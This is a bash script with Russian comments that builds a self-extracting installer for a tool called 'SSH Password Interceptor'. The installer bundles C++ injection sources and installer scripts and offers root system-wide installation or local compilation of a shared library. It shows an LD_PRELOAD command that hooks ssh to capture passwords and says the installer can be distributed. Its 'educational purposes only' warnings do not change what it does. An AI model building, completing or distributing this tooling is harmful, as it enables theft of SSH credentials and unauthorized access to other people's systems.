#!/bin/bash

# SSH Password Interceptor - Скрипт упаковки в самораспаковывающийся установщик
# Версия 1.1.0

echo "====================================="
echo "   SSH Password Interceptor v1.1.0"
echo "   Создание установщика"
echo "====================================="
echo ""

# Проверка наличия необходимых файлов
REQUIRED_FILES=("state.hpp" "ssh_inject.cpp" "compile.sh" "installer.sh" "uninstall.sh" "README.md")
MISSING_FILES=()

for file in "${REQUIRED_FILES[@]}"; do
    if [ ! -f "SCRSCR/$file" ]; then
        MISSING_FILES+=("$file")
    fi
done

if [ ${#MISSING_FILES[@]} -ne 0 ]; then
    echo "Ошибка: не найдены следующие файлы:"
    for file in "${MISSING_FILES[@]}"; do
        echo "- $file"
    done
    echo "Убедитесь, что все файлы находятся в директории SCRSCR/"
    exit 1
fi

# Создаем временную директорию
TEMP_DIR=$(mktemp -d)
echo "Создана временная директория: $TEMP_DIR"

# Копируем необходимые файлы во временную директорию
echo "Копирование файлов..."
for file in "${REQUIRED_FILES[@]}"; do
    cp "SCRSCR/$file" "$TEMP_DIR/"
done

# Создаем архив
echo "Создание архива..."
tar -czf "$TEMP_DIR/files.tar.gz" -C "$TEMP_DIR" "${REQUIRED_FILES[@]}"

# Создаем самораспаковывающийся установщик
OUTPUT_FILE="SCRSCR/packed_installer.sh"
echo "Создание самораспаковывающегося установщика: $OUTPUT_FILE"

cat > "$OUTPUT_FILE" << 'HEADER'
#!/bin/bash

# SSH Password Interceptor - Самораспаковывающийся установщик
# Версия 1.1.0

echo "====================================="
echo "   SSH Password Interceptor v1.1.0"
echo "   Самораспаковывающийся установщик"
echo "====================================="
echo ""

# Создаем временную директорию
TEMP_DIR=$(mktemp -d)
echo "Создана временная директория: $TEMP_DIR"

# Извлекаем архив
echo "Распаковка файлов..."
ARCHIVE_START=$(awk '/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }' "$0")

tail -n+$ARCHIVE_START "$0" | tar xzf - -C "$TEMP_DIR"

if [ $? -ne 0 ]; then
    echo "Ошибка при распаковке архива."
    exit 1
fi

# Переход во временную директорию
cd "$TEMP_DIR" || exit 1

# Определение операционной системы
OS=$(uname -s)
echo "Обнаружена операционная система: $OS"

# Проверка на Linux
if [ "$OS" != "Linux" ]; then
    echo "Предупреждение: Этот установщик оптимизирован для Linux."
    echo "Для macOS и других систем могут потребоваться дополнительные настройки."
fi

echo ""
echo "ПРЕДУПРЕЖДЕНИЕ: Этот инструмент предназначен ТОЛЬКО для образовательных целей."
echo "Использование для несанкционированного доступа к системам является незаконным."
echo ""

# Предоставление опций
echo "Выберите действие:"
echo "1. Установить системно (требуются права root)"
echo "2. Скомпилировать локально (для текущего пользователя)"
echo "3. Распаковать файлы в текущую директорию"
echo "4. Выход без установки"
echo ""
read -p "Ваш выбор (1-4): " choice

case $choice in
    1)
        echo "Запуск системной установки..."
        # Проверка наличия прав root
        if [ "$EUID" -ne 0 ]; then
            echo "Для системной установки требуются права root."
            echo "Пожалуйста, запустите следующую команду с sudo:"
            echo "sudo ./installer.sh"
            
            # Копируем установщик во временную директорию
            TMP_INSTALLER="/tmp/ssh_interceptor_installer.sh"
            cp installer.sh "$TMP_INSTALLER"
            chmod +x "$TMP_INSTALLER"
            
            echo "Установщик скопирован в $TMP_INSTALLER"
            echo "Выполните: sudo $TMP_INSTALLER"
            exit 0
        else
            # Запускаем установщик
            chmod +x installer.sh
            ./installer.sh
        fi
        ;;
    2)
        echo "Компиляция библиотеки локально..."
        chmod +x compile.sh
        ./compile.sh
        
        # Копируем скомпилированную библиотеку в текущую директорию
        if [ -f "libssh_inject.so" ]; then
            cp libssh_inject.so ~/libssh_inject.so
            echo "Библиотека скопирована в ~/libssh_inject.so"
            echo ""
            echo "Для использования выполните команду:"
            echo "LD_PRELOAD=~/libssh_inject.so ssh user@host"
        else
            echo "Ошибка: компиляция не удалась."
        fi
        ;;
    3)
        echo "Распаковка файлов в текущую директорию..."
        TARGET_DIR=~/ssh_interceptor
        mkdir -p "$TARGET_DIR"
        cp -v * "$TARGET_DIR/"
        echo ""
        echo "Файлы распакованы в $TARGET_DIR"
        echo "Для компиляции выполните:"
        echo "cd $TARGET_DIR && ./compile.sh"
        ;;
    4)
        echo "Выход без установки."
        ;;
    *)
        echo "Неверный выбор. Выход без установки."
        ;;
esac

# Очистка
echo "Очистка временных файлов..."
cd - > /dev/null
rm -rf "$TEMP_DIR"

echo ""
echo "Спасибо за использование SSH Password Interceptor!"
exit 0

__ARCHIVE_BELOW__
HEADER

# Добавляем архив к самораспаковывающемуся скрипту
cat "$TEMP_DIR/files.tar.gz" >> "$OUTPUT_FILE"

# Устанавливаем права доступа
chmod +x "$OUTPUT_FILE"

# Очистка
echo "Очистка временных файлов..."
rm -rf "$TEMP_DIR"

echo ""
echo "Самораспаковывающийся установщик создан: $OUTPUT_FILE"
echo "Вы можете распространять этот файл для установки SSH Password Interceptor."
echo ""
echo "ПРЕДУПРЕЖДЕНИЕ: Этот инструмент предназначен ТОЛЬКО для образовательных целей."
echo "Распространение этого инструмента для несанкционированного доступа к системам"
echo "является незаконным и неэтичным." 